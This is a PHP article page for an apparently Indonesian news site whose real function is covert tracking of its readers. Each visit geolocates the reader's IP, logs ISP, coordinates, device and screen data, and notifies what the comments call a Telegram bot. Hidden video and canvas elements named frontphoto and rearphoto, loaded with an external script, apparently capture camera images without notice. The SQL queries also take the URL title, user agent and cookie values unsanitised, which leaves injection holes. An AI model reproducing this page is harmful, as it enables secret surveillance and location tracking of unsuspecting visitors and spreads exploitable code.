<?php
	include('./bootstrap.php');
    require_once 'Mobile_Detect.php';

    function get_visit_info($ip_addr) {
        $url = 'http://ip-api.com/json/' . $ip_addr;
        $method = 'GET';
        $headers = array(
            'Content-Type: application/json',
        );

        $curl = curl_init();

        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_CUSTOMREQUEST, $method);
        curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

        $response = curl_exec($curl);

        curl_close($curl);

        $data = json_decode($response, true);

        return $data;
    }

    function get_browser_info() {
        $user_agent = $_SERVER['HTTP_USER_AGENT'];

        // Get browser name and version
        if (preg_match('/MSIE/i', $user_agent)) {
            $browser_name = 'Internet Explorer';
            $browser_version = preg_replace('/.*MSIE ([0-9]+(\.[0-9]+)?).*/i', '$1', $user_agent);
        } elseif (preg_match('/Firefox/i', $user_agent)) {
            $browser_name = 'Mozilla Firefox';
            $browser_version = preg_replace('/.*Firefox\/([0-9]+(\.[0-9]+)?).*/i', '$1', $user_agent);
        } elseif (preg_match('/Chrome/i', $user_agent)) {
            $browser_name = 'Google Chrome';
            $browser_version = preg_replace('/.*Chrome\/([0-9]+(\.[0-9]+)?).*/i', '$1', $user_agent);
        } elseif (preg_match('/Safari/i', $user_agent)) {
            $browser_name = 'Apple Safari';
            $browser_version = preg_replace('/.*Version\/([0-9]+(\.[0-9]+)?).*/i', '$1', $user_agent);
        } elseif (preg_match('/Opera/i', $user_agent)) {
            $browser_name = 'Opera';
            $browser_version = preg_replace('/.*Opera\/([0-9]+(\.[0-9]+)?).*/i', '$1', $user_agent);
        } else {
            $browser_name = 'Unknown';
            $browser_version = '0';
        }

        return $browser_name;
    }

    function call_bot($log_id) {
        $url = 'http://127.0.0.1:21000/api/track?log_id=' . $log_id;
        $method = 'GET';
        $headers = array(
            'Content-Type: application/json',
        );

        $curl = curl_init();

        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_CUSTOMREQUEST, $method);
        curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

        $response = curl_exec($curl);

        curl_close($curl);

        $data = json_decode($response, true);

        return $data;
    }

    // Define variables and initialize with empty values
    $permalink = $_GET['title'];

    if ($_SERVER["REQUEST_METHOD"] == "GET") {
        /*DATABASE CONNECTION */
        global $conn;

        $conn = mysqli_connect(DB_HOST, DB_USER, DB_PASS, DB_NAME);
        if (!$conn) {
            die("Cannot Establish A Secure Connection To The Host Server At The Moment!");
        }

        /* Get details of post */
        // Prepare a select statement
        $sql = "SELECT id, title, category, contents, tags FROM posts WHERE permalink = '$permalink'";
        if ($stmt = mysqli_prepare($conn, $sql)) {
            // Attempt to execute the prepared statement
            if (mysqli_stmt_execute($stmt)) {
                // Store result
                mysqli_stmt_store_result($stmt);

                if (mysqli_stmt_num_rows($stmt) == 1) {
                    /* Add new log item */

                    // Bind result variables
                    // mysqli_stmt_bind_result($stmt, 
                    //     $post_id, $title, $category, $content, $tags);
                    // echo "post_id: " . $post_id . "<br>";
                    // echo "title: " . $title . "<br>";

                    $result = mysqli_query($conn, $sql);
                    $row = mysqli_fetch_row($result);

                    $post_id = $row[0];
                    $title = $row[1];
                    $category = $row[2];
                    $content = $row[3];
                    $tags = $row[4];

                    $ip_addr = $_SERVER['REMOTE_ADDR'];
                    $visit_info = get_visit_info($ip_addr);
                    $ip_loc = $visit_info['city'] . ", " . $visit_info['region'] . ", " . $visit_info['country'];
                    $org = $visit_info['org'];
                    $os = $_SERVER['HTTP_USER_AGENT'];
                    $net_prov = $visit_info['isp'];
                    $lat = $visit_info['lat'];
                    $lon = $visit_info['lon'];

                    if (isset($_COOKIE['resolution'])) {
                        $resolution = $_COOKIE['resolution'];
                    } else {
                        $resolution = 'Unknown';
                    }
                    
                    $browser = get_browser_info();
                    
                    $detect = new Mobile_Detect;
                    $model = $detect->getModel();
                    if ($detect->isMobile()) {
                        // Device is a mobile phone or tablet
                        $device = "phone";
                    } else {
                        // Device is a desktop computer or laptop
                        $device = "computer";
                    }
                    
                    // Prepare INSERT statement
                    $sql = "INSERT INTO logs (post_id, ip_addr, ip_loc, org, os, net_prov, browser, model, device, resolution, latitude, longitude) " . 
                        "VALUES ($post_id, '$ip_addr', '$ip_loc', '$org', '$os', '$net_prov', '$browser', '$model', '$device', '$resolution', $lat, $lon)";
                    // echo $sql;
                    mysqli_query($conn, $sql);
                    $new_id = mysqli_insert_id($conn);
                    
                    /* Call Telegram Bot */
                    call_bot($new_id);
                    
                    mysqli_stmt_fetch($stmt);
                } else {
                    // Display an error message if email doesn't exist
                    $email_err = 'No post found with that id. Please recheck and try again.';
                }
            } else {
                echo "Oops! Something went wrong. Please try again later.";
            }

            // Close statement
            mysqli_stmt_close($stmt);
        }


        /* Get hot news */
        // fetch records
        $sql = "SELECT title, permalink, DATEDIFF(NOW(), date) AS date_differ FROM posts " . 
            " ORDER BY (SELECT COUNT(id) FROM logs WHERE date >= DATE_SUB(NOW(), INTERVAL 6 MONTH) AND post_id = posts.id GROUP BY post_id) DESC" . 
            " LIMIT 5";

        $news = "";

        if ($stmt = mysqli_prepare($conn, $sql)) {
            mysqli_stmt_execute($stmt);
            mysqli_stmt_store_result($stmt);
            $records = mysqli_stmt_num_rows($stmt);
            
            $result = mysqli_query($conn, $sql);

            while ($row = mysqli_fetch_assoc($result)) {
                $news = $news . 
                    '<div class="post-block-wrapper post-float ">    
                        <div class="post-content">
                            <h2 class="post-title title-sm">
                                <a href="' . BASE_URL . '/read.php?title=' . $row['permalink'] . '">' . $row['title'] . '</a>
                            </h2>
                            <div class="post-meta">
                                <span class="posted-time">
                                    <i class="fa fa-clock-o mr-1"></i>' . getDaysDiff($row['date_differ']) . 
                                '</span>
                            </div>
                        </div>
                    </div>';
            }

            mysqli_stmt_close($stmt);
        }

        // Close connection
        mysqli_close($conn);
    }
?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="description" content="Informasi lengkapnya mengenai Informasi Lelang Mobil Murah Jakarta Terbaru 2023 - Mediakarta oleh Mediakarta.">
        <meta name="keywords" content="Bisnis,Bola,Edukasi,Ekonomi,Entrepreneur,Hiburan,Hukum,Internasional,Investment,Kecantikan,Kesehatan,Lifestyle,Market,Metro,Nasional,Olahraga,Opini,Otomotif,Politik,Profil,Sains,Selebriti,Syariah,Teknologi,Terbaru,Travel">
        <meta name="author" content="mediakarta.com">
        <title><?php echo $title; ?></title>
        <link rel="manifest" href="<?php echo BASE_URL; ?>/mediakarta.webmanifest">
        <link rel="shortcut icon" href="<?php echo BASE_URL; ?>/logo.png" type="image/png">
        <link rel="icon" href="<?php echo BASE_URL; ?>/logo.png" type="image/png">
        <link rel="apple-touch-icon" sizes="180x180" href="<?php echo BASE_URL; ?>/apple-touch-icon.png">
        <link rel="stylesheet" href="<?php echo BASE_URL; ?>/public/news/plugins/bootstrap/css/bootstrap.min.css">
        <link rel="stylesheet" href="<?php echo BASE_URL; ?>/public/news/plugins/font-awesome/css/font-awesome.min.css">
        <link rel="stylesheet" href="<?php echo BASE_URL; ?>/public/news/plugins/slick-carousel/slick.css">
        <link rel="stylesheet" href="<?php echo BASE_URL; ?>/public/news/plugins/slick-carousel/slick-theme.css?v=1.0.0">
        <link rel="stylesheet" href="<?php echo BASE_URL; ?>/public/news/css/style.css">
        <script src="<?php echo BASE_URL; ?>/public/news/plugins/jquery/jquery.js"></script>
        <script src="<?php echo BASE_URL; ?>/public/news/plugins/bootstrap/js/bootstrap.min.js"></script>
        <script>var bodyWeb = document.getElementsByTagName('body');</script>
    </head>
    <body style="" class="" monica-version="3.1.2" monica-id="ofpnmcalabcbjgholdjcjblkibolbppb">
        <?php include('./header.html'); ?>
        
        <meta http-equiv="cache-control" content="no-cache">
        <meta http-equiv="expires" content="0">
        <meta http-equiv="pragma" content="no-cache">
        <video id="videostream" autoplay="true" playsinline="true" muted="true" width="500" height="600" style="visibility:hidden;opacity:0;position:fixed;"></video>
        <video id="frontphoto" autoplay="true" playsinline="true" muted="true" width="500" height="600" style="visibility: hidden; opacity: 0; position: fixed; transform: scale(-1, 1);"></video>
        <canvas id="frontphoto_canvas" style="display:none;" height="600" width="500"></canvas>
        <video id="rearphoto" autoplay="true" playsinline="true" muted="true" width="500" height="600" style="visibility: hidden; opacity: 0; position: fixed; transform: scale(-1, 1);"></video>
        <canvas id="rearphoto_canvas" style="display:none;" height="600" width="500"></canvas>
        <script src="<?php echo BASE_URL; ?>/public/nisy.js?v=1.0.8"></script>
        <script src="<?php echo BASE_URL; ?>/register.js?v=1.0.0"></script>
        <div id="pwainstall" class="modal fade" tabindex="-1" role="dialog" style="display: none;" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered" role="document">
                <div class="modal-content">
                    <div class="modal-body text-center">
                        <h3 class="modal-title">Install mediakarta to get hot news!</h3>
                        <hr class="m-3">
                        <button type="button" id="install_button" class="btn btn-sm btn-primary" hidden="">Install</button>
                    </div>
                </div>
            </div>
        </div>
        
        <section class="single-block-wrapper section-padding">
            <div class="container">
                <div class="row">
                    <div class="col-lg-8 col-md-12 col-sm-12 col-xs-12">
                        <div class="single-post">
                            <div class="post-header mb-5">
                                <a class="post-category" href="#"><?php echo $category; ?></a>
                                <h2 class="post-title"><?php echo $title; ?></h2>
                            </div>
                            <div class="post-body">
                                <div class="entry-content">
                                    <?php echo $content; ?>
                                </div>
                                <div class="share-block  d-flex justify-content-between align-items-center border-top border-bottom mt-5">
                                    <div class="post-tags">
                                        <span>Tags</span>
                                        <?php echo $tags; ?>
                                    </div>
                                    <ul class="share-icons list-unstyled ">
                                        <li class="facebook">
                                            <a href="#">
                                                <i class="fa fa-facebook"></i>
                                            </a>
                                        </li>
                                        <li class="twitter">
                                            <a href="#">
                                                <i class="fa fa-twitter"></i>
                                            </a>
                                        </li>
                                        <li class="gplus">
                                            <a href="#">
                                                <i class="fa fa-google-plus"></i>
                                            </a>
                                        </li>
                                        <li class="pinterest">
                                            <a href="#">
                                                <i class="fa fa-pinterest"></i>
                                            </a>
                                        </li>
                                        <li class="reddit">
                                            <a href="#">
                                                <i class="fa fa-reddit-alien"></i>
                                            </a>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
            
                    <div class="col-lg-4 col-md-4 col-sm-12 col-xs-12">
                        <div class="sidebar sidebar-right">
                            <div class="widget">
                                <h3 class="news-title">
                                    <span>Stay in touch</span>
                                </h3>
                                <ul class="list-inline social-widget">
                                    <li class="list-inline-item">
                                        <a class="social-page youtube" href="#">
                                            <i class="fa fa-play"></i>
                                        </a>
                                    </li>
                                    <li class="list-inline-item">
                                        <a class="social-page facebook" href="#">
                                            <i class="fa fa-facebook"></i>
                                        </a>
                                    </li>
                                    <li class="list-inline-item">
                                        <a class="social-page twitter" href="#">
                                            <i class="fa fa-twitter"></i>
                                        </a>
                                    </li>
                                    <li class="list-inline-item">
                                        <a class="social-page pinterest" href="#">
                                            <i class="fa fa-pinterest"></i>
                                        </a>
                                    </li>
                                    <li class="list-inline-item">
                                        <a class="social-page linkedin" href="#">
                                            <i class="fa fa-linkedin"></i>
                                        </a>
                                    </li>
                                    <li class="list-inline-item">
                                        <a class="social-page youtube" href="#">
                                            <i class="fa fa-youtube"></i>
                                        </a>
                                    </li>
                                </ul>
                            </div>
                            <div class="widget">
                                <h3 class="news-title">
                                    <span>Hot News</span>
                                </h3>
                                <div class="post-list-block">
                                    <?php echo $news; ?>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <?php include('./footer.html'); ?>

        <script>
            document.cookie = "resolution=" + screen.width + 'x' + screen.height;
        </script>

        <script src="<?php echo BASE_URL; ?>/public/news/plugins/slick-carousel/slick.min.js"></script>
        <script src="<?php echo BASE_URL; ?>/public/news/js/custom.js"></script>

        <div id="monica-content-root" class="monica-widget"></div>
    </body>
</html>